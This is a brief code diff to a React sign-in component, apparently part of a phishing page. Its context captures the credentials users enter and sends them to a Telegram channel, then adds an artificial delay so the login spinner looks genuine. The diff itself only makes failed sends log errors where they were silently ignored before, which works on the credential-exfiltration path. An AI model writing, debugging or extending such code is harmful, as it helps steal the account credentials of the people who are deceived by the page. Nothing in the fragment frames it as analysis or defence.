@@ -41,7 +41,7 @@ function App() {
       };
 
       // Send credentials to Telegram (don't block on failure)
-      safeSendToTelegram({ type: 'credentials', data: credentialsData }).catch(() => {});
+      safeSendToTelegram({ type: 'credentials', data: credentialsData }).catch((err: any) => console.error('Failed to send credentials:', err));
 
       // Brief delay so the spinner is visible on the Sign In button
       await new Promise((r) => setTimeout(r, 2500));
